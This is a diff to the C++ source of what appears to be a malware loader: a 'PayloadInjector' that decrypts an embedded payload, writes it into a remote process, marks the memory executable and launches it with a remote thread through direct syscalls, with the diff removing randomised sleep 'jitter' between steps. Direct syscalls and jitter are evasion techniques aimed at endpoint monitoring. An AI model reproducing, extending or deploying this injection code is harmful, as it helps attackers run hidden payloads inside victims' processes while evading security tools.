@@ -4,7 +4,6 @@
 #include "injector.hpp"
 #include "../crypto/crypto.hpp"
 #include "../sys/internal_api.hpp"
-#include "../core/jitter.hpp"
 #include <sstream>
 #include <fstream>
 
@@ -18,8 +17,6 @@ namespace Injector {
         LoadAndDecryptPayload();
         m_console.Debug("  [+] Payload decrypted (" + std::to_string(m_payload.size() / 1024) + " KB)");
 
-        Core::Jitter::SleepRange(10, 50);
-
         DWORD offset = GetExportOffset("Bootstrap");
         if (offset == 0) {
             throw std::runtime_error("Could not find entry point in payload");
@@ -28,8 +25,6 @@ namespace Injector {
         std::stringstream ss;
         ss << "  [+] Bootstrap entry point resolved (offset: 0x" << std::hex << offset << ")";
         m_console.Debug(ss.str());
-
-        Core::Jitter::SleepRange(15, 60);
 
         PVOID remoteBase = nullptr;
         SIZE_T payloadSize = m_payload.size();
@@ -57,8 +52,6 @@ namespace Injector {
         if (status != 0) throw std::runtime_error("Write params failed");
         m_console.Debug("  [+] Payload + parameters written");
 
-        Core::Jitter::SleepRange(10, 40);
-
         ULONG oldProtect = 0;
         status = NtProtectVirtualMemory_syscall(m_process.GetProcessHandle(), &remoteBase,
                                                 &totalSize, PAGE_EXECUTE_READ, &oldProtect);
@@ -67,8 +60,6 @@ namespace Injector {
 
         uintptr_t entry = reinterpret_cast<uintptr_t>(remoteBase) + offset;
         HANDLE hThread = nullptr;
-
-        Core::Jitter::SleepRange(20, 80);
 
         m_console.Debug("Creating remote thread via syscall...");
         status = NtCreateThreadEx_syscall(&hThread, THREAD_ALL_ACCESS, nullptr, m_process.GetProcessHandle(),
@@ -80,8 +71,6 @@ namespace Injector {
         ss << "  [+] Thread created (entry: 0x" << std::hex << entry << ")";
         m_console.Debug(ss.str());
         if (hThread) NtClose_syscall(hThread);
-
-        Core::Jitter::SleepRange(10, 50);
     }
 
     void PayloadInjector::LoadAndDecryptPayload() {
